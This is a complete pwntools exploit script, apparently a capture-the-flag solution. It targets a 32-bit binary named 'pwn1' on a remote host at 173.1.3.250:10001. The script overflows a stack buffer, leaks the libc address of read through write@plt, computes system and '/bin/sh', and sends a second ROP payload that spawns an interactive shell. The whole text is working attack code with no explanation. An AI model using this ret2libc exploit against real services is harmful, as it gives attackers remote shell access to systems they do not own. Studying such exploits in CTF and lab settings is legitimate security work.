from pwn import *

debug = False
if debug:
	io = process("./pwn1")
	elf = ELF("./pwn1")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
else:
	#change this line!!!!!!!!!!!!!!!!!!!!!!!
	io = remote("173.1.3.250",10001)
	elf = ELF("./pwn1")
	libc = ELF("./libc.so.6")

context.log_level = "debug"
#rdi,rsi,rdx	
write_plt = elf.plt["write"]
read_got = elf.got["read"]
write_got = elf.got["write"]
main_addr = 0x08048469
char_num = 0x88
magic = 0x08048449
bss_addr = 0x0804A018

gdb.attach(io,"b *0x08048449\nb *0x08048469")
payload_pad = char_num * "a" + "a"*4
print hex(write_plt),hex(read_got)
payload1 = payload_pad + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4)
#io.recvuntil("Hello, World\n")
io.send(payload1)
read_addr = u32(io.recv(4))
log.success("read_addr:"+hex(read_addr))
libc.address = read_addr - libc.symbols["read"]
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
log.success("system_addr:"+hex(system_addr))
payload2 = payload_pad + p32(system_addr) + "junk" + p32(binsh)
io.sendline(payload2)
io.interactive()
